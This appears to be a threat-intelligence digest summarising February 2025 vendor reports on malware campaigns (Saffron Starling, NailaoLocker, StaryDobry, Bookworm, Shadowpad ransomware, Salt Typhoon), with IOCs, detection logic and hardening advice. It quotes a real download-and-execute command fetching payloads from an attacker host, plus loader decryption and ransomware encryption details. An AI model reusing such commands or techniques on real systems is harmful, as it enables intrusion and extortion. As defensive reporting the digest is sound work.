## Intelligence Insights: February 2025

### Summary

The February 2025 Red Canary Intelligence Insights report highlights two new threats in the top 10: **Infrared Ibis** and **Saffron Starling**. **Infrared Ibis**, which debuted at number 1, is Red Canary's designation for a cluster of **compromised Chrome extensions designed to steal cookies**. Compromises related to this threat date back to May 2024. **Saffron Starling**, tied for 8th place, is a cluster of activity that **downloads and delivers malicious payloads** like Danabot, Darkgate, and Matanbuchus. The report also discusses a reassessment of ChromeLoader activity; activity previously tracked as ChromeLoader is now tracked as a variation of Browser Assistant.

### Technical Details

*   **Infrared Ibis:** This threat involves compromised Chrome extensions containing malicious code to steal cookies. The compromise dates back to May 2024.[ Cyberhaven disclosed a compromise of version 24.10.4 of their Chrome extension in December 2024](https://github.com/cr-RuslanRustchev/The-Feed/blob/main/summaries/The%20Feed%202025-01-28.md).
*   **Saffron Starling:** This threat involves a multi-stage attack:
    *   It starts with a **.zip archive containing a script file** (.vbs or .js).
    *   **Windows Scripting Host (wscript.exe) executes the script**.
    *   The script, typically obfuscated, launches cmd.exe or PowerShell to download the next-stage payload from a remote resource.
    *   Observed payloads include Danabot, DarkGate, and Matanbuchus.
    *   **Observed Commands:**
        *   `"C:\Windows\System32\cmd.exe" /c cd /d "C:\Users\user\AppData\Local\Temp\" & copy c:\windows\system32\curl.exe TNheBOJElq.exe & TNheBOJElq.exe -o "C:\Users\user\Documents\QMQjaBdqIo.pdf" hxxps://bologna.sunproject[.]dev/download/pdf & "C:\Users\user\Documents\QMQjaBdqIo.pdf" & TNheBOJElq.exe -o bLhLldebqq.msi hxxps://rome.sunproject[.]dev/download/agent & C:\Windows\System32\msiexec.exe /i bLhLldebqq.msi /qn`
        *   The command above uses `cmd.exe` to change the directory, copy `curl.exe`, download a PDF and an MSI file, and then execute them.
*   **ChromeLoader/Browser Assistant:** Red Canary has reassessed activity previously tracked as ChromeLoader and now attributes it to a variation of Browser Assistant. This activity involves adware that masquerades as a PDF-themed download and installs itself in suspiciously named directories. While it’s considered to be “just” adware, the 2024 activity has several distinct differences when compared to traditional Browser Assistant:

    - It attempts to masquerade as a PDF-themed download
    - It installs itself in suspiciously named directories
    - Occasionally it has a signing certificate that is registered to a different organization than the traditional “Realistic Media”

### Recommendations

*   The report highlights the **importance of tracking loaders like Saffron Starling separately from their payloads** to monitor activity even without payload execution and to improve detection coverage.
*   The report recommends investigating further when detecting script launching PowerShell to download and execute a payload. Child processes and file modifications to suspicious directories can indicate successful payload execution.

### Hunting methods

*   **Saffron Starling Detection:** The report provides a pseudo-detection analytic to identify wscript, cscript, or mshta launching PowerShell to download and execute a payload:

```
parent_process == (wscript.exe, cscript.exe, mshta.exe)

&&

process == (cmd.exe, powershell.exe)

&&

command_includes (“invoke_webrequest”)
```

## Meet NailaoLocker: a ransomware distributed in Europe by ShadowPad and PlugX backdoors

### Summary

The report discusses a campaign tracked as **Green Nailao** by Orange Cyberdefense CERT that targeted European organizations, including those in the healthcare sector, between June and October 2024. The campaign involved the deployment of **ShadowPad and PlugX** via DLL search-order hijacking. In some instances, a previously undocumented ransomware payload named **NailaoLocker** was deployed. The initial access vector was the compromise of Check Point VPN appliances, likely through the exploitation of CVE-2024-24919. The threat actors are assessed with medium confidence to align with typical Chinese intrusion sets. Despite some overlaps with known intrusion sets, Green Nailao is not currently associated with a specific group.

### Technical Details
*   **Initial Access:** The campaign likely started with the **exploitation of CVE-2024-24919** on vulnerable Check Point Security Gateways. This flaw allowed the threat actors to retrieve user credentials and connect to the VPN using a legitimate account.
*   **Lateral Movement:** After gaining access, the threat actors performed network reconnaissance and moved laterally, primarily through **RDP**, to gain additional privileges.
*   **Malware Deployment:**
    *   **ShadowPad:** A legitimate binary ("logger.exe") was manually executed to **side-load a malicious DLL** ("logexts.dll"). The DLL then copied an encrypted payload to a Windows registry key and injected it into another process. A service or startup task was created to maintain persistence. The ShadowPad variant analyzed was heavily obfuscated. ShadowPad established communication with a C2 server.
    *   **PlugX:** Similar TTPs were used to distribute PlugX. A legitimate McAfee executable ("mcoemcpy.exe") was used to **side-load a malicious DLL** ("McUtil.dll"). The DLL created a Windows service for persistence and attempted to escalate privileges. The loader then decrypted a file called "Mc.cp" and injected shellcode into a suspended process using process hollowing.
    ![alt text](<images/The Feed 2025-02-24_1.png>)

    *   **NailaoLocker:** The threat actors ran a script targeting local IP addresses and used WMI to send three files to each host:
        *   "usysdiag.exe" (a legitimate executable signed by Beijing Huorong Network Technology Co., Ltd)
        *   "sensapi.dll" (**NailaoLoader**)
        *   "usysdiag.exe.dat" (obfuscated **NailaoLocker**)
    *   "usysdiag.exe" was used to **side-load NailaoLoader** ("sensapi.dll") and NailaoLocker ("usysdiag.exe.dat"). NailaoLoader retrieves the calling module address and checks for certain byte values to ensure it is loaded by the correct binary, launching the malware routine.
    *   NailaoLoader decrypts NailaoLocker using the following loop:

        `decrypted_byte = ((encrypted_byte + 0x4b ) ^ 0x3f) - 0x4b`
    *   The loader writes random data from the legitimate binary into the ".dat" payload before removing it. It then loads the decrypted NailaoLocker executable sections into a memory segment, gets imports, and jumps to its entry point.
*   **Data Exfiltration:** The threat actors accessed files and folders, creating ZIP archives, suggesting **data exfiltration attempts**. In one case, the "ntds.dit" database file was captured.
*   **Anonymization:** The threat actors used a compromised IoT device in Sweden and a Proton VPN exit node to connect to the Check Point VPN.
*   **Observed Commands:**
    Unfortunately, the report does not provide specific command examples. However, the report does mention the use of WMI to send files to other hosts, and the use of legitimate binaries to side load malicious payloads.
*   **Similarities to Other Threat Actors**: The report mentions some weak TTP overlaps with Cluster Alpha, who also used "usysdiag.exe" to sideload “SensAPI.dll”.

### Countries

*   European organizations were targeted.

### Industries

*   The **healthcare sector** was specifically targeted.

### Recommendations

*   The report highlights the importance of applying security patches as soon as they are released.
*   Organizations should monitor for exploitation attempts targeting `CVE-2024-24919`.
*   Organizations should implement robust firewall logging and traffic details.

### Hunting methods

*   The report provides the following information that can be used for hunting:
    *   Monitor for the execution of legitimate binaries (e.g., "logger.exe", "mcoemcpy.exe", "usysdiag.exe") to side-load malicious DLLs.
    *   Monitor for the creation of Windows services or startup tasks to maintain system persistence.
    *   Monitor for WMI activity used to send files to other hosts.

### IOC

*   **IP Addresses:**
    *   193[.]56.255.14 (likely belonging to the same ShadowPad cluster)
    *   Additional IP addresses can be found on the Orange Cyberdefense CERT GitHub page.
*   **File Names:**
    *   logger.exe
    *   logexts.dll
    *   0EEBB9B4.tmp
    *   mcoemcpy.exe
    *   McUtil.dll
    *   Mc.cp
    *   usysdiag.exe
    *   sensapi.dll (NailaoLoader)
    *   usysdiag.exe.dat (NailaoLocker)
*   **CVE:**
    *   CVE-2024-24919

## StaryDobry ruins New Year’s Eve, delivering miner instead of presents

### Summary

The report details a **mass infection campaign** launched by cybercriminals on December 31, exploiting the holiday season to distribute the **XMRig cryptominer**. The threat actor, dubbed StaryDobry, targeted users worldwide via **trojanized versions of popular games** distributed through **torrent sites**. The campaign, which lasted for a month, affected both individuals and businesses. Kaspersky products detect this threat as Trojan.Win64.StaryDobry.\*, Trojan-Dropper.Win64.StaryDobry.\*, and HEUR:Trojan.Win64.StaryDobry.gen.

### Technical Details

*   **Initial Infection:** The campaign was initiated on December 31 and distributed through popular torrent trackers.
*   **Trojanized Games:** Attackers spread trojanized versions of popular games such as BeamNG.drive, Garry’s Mod, Dyson Sphere Program, Universe Sandbox, and Plutocracy. These malicious releases were created in advance and uploaded around September 2024.
*   **Infection Chain:** The trojanized installers initiate a sophisticated infection chain to deploy a miner implant.
*   **Trojanized Installer:** The installer, created with Inno Setup, presents a GUI screen with options to install the game, choose a language, or quit.
*   **Malicious File Extraction:** The installer decrypts "unrar.dll" using the DECR function, a proxy for the RARExtract function within the "rar.dll" library. AES encryption with a hard-coded key is used to decrypt "unrar.dll". Additional files are dropped into the temporary directory, and execution proceeds to the RARGetDllVersion function within "unrar.dll".
*   **Anti-Debugging Checks:** The "unrar.dll" dropper performs checks for debugging environments, sandbox modules, and specific software. If detected, execution terminates.
*   **IP Address Detection:** The malware queries multiple sites to determine the user's IP address and country. If detection fails, it defaults to "CNOrBY" (China or Belarus).
    *   The malware attempts to query the following list of sites to determine the user’s IP address:
        *   api.myip[.]com
        *   ip-api[.]com
        *   ipapi[.]co
        *   freeipapi[.]com
        *   ipwho[.]is
        *   api.miip[.]my
*   **Fingerprint Collection:** The malware collects a fingerprint of the infected machine, including MAC address, machine ID, username, country, Windows version, memory, number of processors, video information, and game ID. This fingerprint is encoded using URL-safe Base64.
*   **Filename Generation:** The malware retrieves MachineGUID and calculates its SHA256 checksum, using a portion of the hash as a filename for ".dat" and ".efi" files in the %SystemRoot% directory. The creation time of the ".dat" file is spoofed.
*   **Payload Dropping:** "unrar.dll" prepares to drop the decrypted MTX64.exe to disk, generating a new filename based on existing files in %SystemRoot% or %SystemRoot%\Sysnative. If the directories are empty, the decrypted MTX64.exe is written to the disk as Windows.Graphics.ThumbnailHandler.dll.
*   **Resource Spoofing:** The loader scans the "_res.rc" file for DLL property names and values and creates a dictionary. It extracts property values from a random DLL in the %SystemRoot% folder and replaces the corresponding dictionary values. The resulting resources are embedded into the decrypted MTX64.exe DLL.
*   **MTX64 DLL:** This DLL, based on EpubShellExtThumbnailHandler, is registered as a .lnk (shortcut) file handler. It creates a separate thread to perform malicious activities.
*   **Communication with C2:** The DLL retrieves MachineGUID, checks for a ".dat" file, and queries the threat actors’ domain.
*   **Payload Download:** The server sends back a JSON, and the malware extracts the MD5 checksum from the "flmd" field to download the next-stage payload from a specified link. The MD5 checksum of the received payload is checked against the checksum from the JSON before executing the "kickstarter" function.
*   **Kickstarter PE:** This PE has an encrypted blob in its resources. It chooses a random name for the payload and decrypts the blob using CryptoPP AES-128. A scheduled task is created to register a server with regsvr32.exe. The loader sends a GET request to a hard-coded address.
*   **Mutex Creation:** Unix.Directory.IconHandler.dll creates a mutex named com\_curruser\_mttx. If this mutex exists, execution stops.
*   **Miner Implant:** A modified XMRig miner executable is used. It checks the number of processor cores and only starts if there are 8 or more. The attacker hosts a mining pool server in their own infrastructure. The miner also checks for running process monitors.

### Countries

*   Russia, Belarus, Kazakhstan, Germany, and Brazil.

### Industries

*   The campaign affected individuals and businesses.

### Recommendations

*   The actors implemented a sophisticated execution chain to deliver the miner implant, exploiting users seeking free games.
*   The attacker’s use of DoH helped conceal communication with their infrastructure, making it harder to detect and trace the campaign.

### Hunting methods

*   Monitor for suspicious processes related to the XMRig miner
*   Monitor registry keys for persistence mechanisms
*   Focus on network connections to the listed domains and IPs associated with the campaign.
*   Monitor for regsvr32.exe executions and scheduled tasks creation.
*   Monitor for the execution of legitimate binaries to side-load malicious DLLs.

## Stately Taurus Activity in Southeast Asia Links to Bookworm Malware

### Summary

Unit 42 researchers have linked **Stately Taurus** (aka Mustang Panda) to the **Bookworm malware** after analyzing infrastructure targeting organizations in countries affiliated with the Association of Southeast Asian Nations (ASEAN). Stately Taurus commonly uses DLL sideloading to execute payloads, specifically the PubLoad malware family. Unit 42 now assesses that Stately Taurus has been using Bookworm malware for nearly a decade.

### Technical Details

*   **Initial Access/Delivery**: Stately Taurus used legitimate executables signed by an automation organization to load a malicious payload. These attacks used the PubLoad malware and DLL sideloading. The archives were likely used in the delivery phase.
*   **PubLoad Malware**: This is a stager malware that gets a second shellcode-based payload from its command and control (C2) server. It uses HTTP requests that mimic legitimate Windows update URLs to communicate with its C2.
    *   The PubLoad's URL uses `v6-winsp1-wuredir`, which differs from `v6-win7sp1-wuredir` used by the legitimate Windows update URL.
*   **Bookworm Malware**: The decoded shellcode decrypts and loads DLLs that comprise the Bookworm malware. This malware uses HTTP POST requests to communicate with its C2 server.
    *   **UUID Shellcode**: Uses ASCII or decoded Base64 strings that represent UUID strings. It calls `UuidFromStringA` to convert the decoded UUIDs to binary data, each of which represents 16 bytes of shellcode. It creates a buffer on the heap using `HeapCreate` and `HeapAlloc` and copies shellcode to buffer on the heap. Uses a callback function of a legitimate API function, such as `EnumChildWindows` or `EnumSystemLanguageGroupsA` to execute the shellcode on the heap.
    *   **ToneShell Backdoor**: A variant of the ToneShell backdoor had the same debug symbol path as the Bookworm loader, suggesting the same developer could have created samples of the two malware families.
        *   Debug path: `C:\Users\hack\Documents\WhiteFile\LTDIS13n\Release\LTDIS13n.pdb`.
    *   **Updates to Bookworm**: Contemporary Bookworm samples no longer use the Loader.dll and readme.txt files. The Bookworm shellcode within readme.txt is now the shellcode represented as UUID parameters. Contemporary Bookworm modules no longer have the ProgramStartup exported function.
*   **Infrastructure Overlap**: There was infrastructure overlap between Bookworm samples and a ToneShell variant used in attacks on government organizations in Southeast Asia.

## Updated Shadowpad Malware Leads to Ransomware Deployment

### Summary

A previously unreported ransomware family has been deployed by threat actors using the **Shadowpad malware**, which is linked to Chinese threat actors. The threat actors target organizations in various countries and industries, gaining access through remote network attacks by exploiting weak passwords and sometimes bypassing multi-factor authentication. After gaining administrative privileges, they deploy the Shadowpad malware and, in some instances, ransomware.

*   **Shadowpad Malware:**
    *   **Delivery and Loading:** Shadowpad typically uses a legitimate signed executable vulnerable to DLL side-loading, a malicious DLL to decode and load the payload, and a binary file containing the encoded Shadowpad payload. The malicious DLL decodes the Shadowpad payload in memory and then encodes it again in the registry using a key derived from the volume serial number, deleting the binary file from the filesystem.
    *   **Anti-Debugging:** The malware uses anti-debugging techniques such as checking the Process Environment Block (PEB), the NtGlobalFlag field, CPU cycles, system start time, thread context, and the ProcessDebugPort field. If debugging is detected, the malware terminates.
    *   **Configuration:** The configuration structure includes a 4-byte header, a 3-byte identifier for each item, and a 1-byte type. Types include one-byte values, two-byte values, four-byte values, encrypted bitstreams, and encrypted strings. IDs specify parameters such as mutex name, campaign note, service names, registry keys, paths, C&C, and DNS servers.
    *   **Updates:** The Shadowpad version in these attacks includes anti-debugging techniques, encryption of the Shadowpad payload in the registry using the volume serial number, changes to the configuration format, and the usage of DNS over HTTPS (DoH).
*   **Ransomware:**
    *   The ransomware loading mechanism involves a legitimate `usysdiag.exe` file, a malicious `sensapi.dll` side-loaded by `usysdiag.exe`, and an encoded payload named `usysdiag.dat`.
    *   **Encryption:** The ransomware encrypts files, excluding those with extensions `.EXE`, `.DLL`, and `.SYS`, and those in `Windows`, `Program Files`, `Program Files (x86)`, `ProgramData`, `AppData`, and `Application Data` folders. It generates a random 32-byte AES key for each file, encrypts the file, XORs the AES key with `0x3F`, encrypts it with a hardcoded public RSA key, and appends the resulting blob to the encrypted file.
    *   **File Renaming and Ransom Note:** Every encrypted file is renamed with the `.locked` extension, and an HTML ransom note (named `locked.html` or `unlock_please_view_this_file.html`) is dropped into directories with encrypted files. The ransom note contains a reference to a website selling the Kodex Evil Extractor tool, but the ransomware's behavior differs from the Kodex ransomware.
*   **Post-Exploitation Tools:**
    *   **CQHashDumpv2:** Used to dump hashes from the system.
    *   **Impacket:** The WmiExec module from the Impacket toolkit is used to connect to remote hosts.
    *   **NTDSUtil (Likely):** Used to create `aaaa.dit` files, likely containing Active Directory database content for offline password cracking.
*   **Initial Access:**
    *   The threat actors compromise targets via remote network attacks, accessing the victim's network after connecting to the VPN using administrative accounts with weak passwords. In one instance, they bypassed a certificate-based multi-factor authentication mechanism.

## Weathering the storm: In the midst of a Typhoon

### Summary

Cisco Talos is monitoring intrusion activity against major U.S. telecommunications companies, attributed to a sophisticated threat actor named Salt Typhoon. The actor uses compromised credentials to gain access to core networking infrastructure and has maintained access for extended periods. The campaign is characterized by the use of living-off-the-land (LOTL) techniques on network devices. No new Cisco vulnerabilities were discovered during this campaign, but the actor may be abusing known vulnerabilities.

### Technical Details

*   **Credential Use and Expansion**: The threat actor uses valid, stolen credentials to gain initial access and actively attempts to acquire additional credentials by obtaining network device configurations and deciphering local accounts with weak password types. They also capture SNMP, TACACS, and RADIUS traffic, including secret keys used between network devices and TACACS/RADIUS servers, to enumerate additional credential details.
*   **Configuration Exfiltration**: Device configurations are often exfiltrated over TFTP and/or FTP. These configurations contain sensitive authentication material, such as SNMP Read/Write (R/W) community strings and local accounts with weak password encryption types in use, which allows the attacker to easily decrypt passwords offline. Configurations also contain named interfaces that allow attackers to understand network segments for reconnaissance and lateral movement.
*   **Infrastructure Pivoting**: The actor pivots through compromised infrastructure, moving within trusted infrastructure sets to avoid detection and using compromised devices as hop points to target other devices. This pivoting involves network equipment from various manufacturers.
*   **Configuration Modification**: The threat actor modifies device running configurations and subsystems associated with Bash and Guest Shell. Modifications include:
    *   AAA/TACACS+ server modification (server IP address change)
    *   Loopback interface IP address modifications
    *   GRE tunnel creation and use
    *   Creation of unexpected local accounts
    *   ACL modifications
    *   SNMP community string modifications
    *   HTTP/HTTPS server modifications on both standard and non-standard ports
    *   Guest Shell enable and disable commands
    *   Starting SSH alternate servers on high ports for persistent access
    *   Creating Linux-level users (modification of “/etc/shadow” and “/etc/passwd”)
    *   Adding SSH “authorized\_keys” under root or other users at Linux level
*   **Packet Capture**: The threat actor uses various tools and techniques to capture packet data:
    *   Tcpdump: A portable command-line utility used to capture packet data at the underlying operating system level.
    *   Tpacap: A Cisco IOS XR command line utility used to capture packets being sent to or from a given interface via netio at the underlying operating system level.
    *   Embedded Packet Capture (EPC): A Cisco IOS feature that allows the capture and export of packet capture data.
*   **Operational Utility (JumbledPath)**: A custom-built utility that executes a packet capture on a remote Cisco device through an actor-defined jump-host. This tool clears logs, impairs logging along the jump-path, and returns the resultant compressed, encrypted capture via another series of actor-defined connections or jumps. The utility is written in GO and compiled as an ELF binary, making it widely usable across Linux operating systems.
*   **Defense Evasion**: The threat actor modifies the address of the loopback interface on a compromised switch and uses that interface as the source of SSH connections to additional devices within the target environment, bypassing access control lists (ACLs). They also clear relevant logs and modify AAA server settings to bypass access control systems.

### Countries

*   U.S.A

### Industries

*   Telecommunications

### Recommendations

*   Follow best practices to secure network infrastructure.
*   Disable the underlying non-encrypted web server using the “no ip http server” command.
*   Disable telnet and ensure it is not available on any of the Virtual Teletype (VTY) lines on Cisco devices by configuring all VTY stanzas with “transport input ssh” and “transport output none”.
*   If not required, disable the guestshell access using “guestshell disable” for those versions which support the guestshell service.
*   Disable Cisco’s Smart Install service using “no vstack”.
*   Utilize type 8 passwords for local account credential configuration and use type 6 for TACACS+ key configuration.
*    Update devices as aggressively as possible.
*   Select complex passwords and community strings and avoid default credentials.
*   Use multi-factor authentication (MFA).
*   Encrypt all monitoring and configuration traffic (SNMPv3, HTTPS, SSH, NETCONF, RESTCONF).
*   Lockdown and aggressively monitor credential systems, such as TACACS+ and any jump hosts.
*   Utilize AAA to deny configuration modifications of key device protections (e.g., local accounts, TACACS+, RADIUS).
*   Prevent and monitor for exposure of administrative or unusual interfaces (e.g., SNMP, SSH, HTTP(s)).
*   Disable all non-encrypted web management capabilities.
*   Verify existence and correctness of access control lists for all management protocols (e.g., SNMP, SSH, Netconf, etc.).
*   Enhance overall credential and password management practices with stronger keys and/or encryption.
*   Store configurations centrally and push to devices and do NOT allow devices to be the trusted source of truth for their configurations.

### Hunting methods

*   Conduct comprehensive configuration management (inclusive of auditing), in line with best practices.
*   Conduct comprehensive authentication/authorization/command issuance monitoring.
*   Monitor syslog and AAA logs for unusual activity, including a decrease in normal logging events, or a gap in logged activity.
*   Monitor your environment for unusual changes in behavior or configuration.
*   Profile (fingerprint via NetFlow and port scanning) network devices for a shift in surface view, including new ports opening/closing and traffic to/from (not traversing).
*   Where possible, develop NetFlow visibility to identify unusual volumetric changes.
*   Look for non-empty or unusually large `.bash\_history` files.
*   Additional identification and detection can be performed using the Cisco forensic guides.
